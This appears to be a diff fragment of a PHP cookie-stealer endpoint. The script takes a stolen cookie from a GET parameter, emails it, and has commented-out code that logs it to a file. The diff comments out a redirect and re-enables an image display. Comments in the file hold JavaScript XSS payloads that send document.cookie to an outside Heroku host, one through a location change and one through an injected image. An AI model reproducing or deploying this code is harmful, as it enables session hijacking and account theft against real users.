@@ -35,14 +35,14 @@ if (isset($_GET["abc"])) {
     
     $mail->Send();
 
-    header('Location: http://matxac.com/');
+//     header('Location: http://matxac.com/');
     
 
 
 //     $f = open("log.txt", "a" );
 //     fwrite( $f, date("Y-m-d h:i:sa").":\n".$cookie."\n\n");
     
-//     echo '<img src="67586673.jpg" alt="hello!"  style="width: 100%; height: auto;">';
+    echo '<img src="67586673.jpg" alt="hello!"  style="width: 100%; height: auto;">';
 
 //document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;
 //var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("[style="display:none;"]").appendChild(elem);
